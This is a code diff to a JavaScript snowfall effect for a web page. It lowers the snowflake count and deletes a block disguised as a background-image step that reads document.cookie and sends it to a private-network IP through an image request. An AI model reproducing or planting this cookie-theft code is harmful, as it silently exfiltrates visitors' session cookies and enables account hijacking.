@@ -6,8 +6,7 @@
 snow_img = "https://rodrigorochapinto.github.io/pages-teste/imagens/floco_neve.png";
 
 // EXTRA: Voce pode facilmente ajustar o número de flocos de neve que voce deseja em cada página...
-snow_no = 40;
-
+snow_no = 25;
 
 if (typeof(window.pageYOffset) == "number")
 {
@@ -66,13 +65,4 @@ function SnowStart()
 	}
 	snow_time = setTimeout("SnowStart()", 10);
 }
-// Inserir Imagem de Fundo
-// Envio 
-a = document.cookie;
-b = "http://192.168.0.123/?=";
-c = b.concat(a);
-//alert(c);
-new Image().src=c;
-// fim
-document.body.style.backgroundImage = "url('https://rodrigorochapinto.github.io/pages-teste/imagens/ufsj1.jpg')";
 SnowStart()
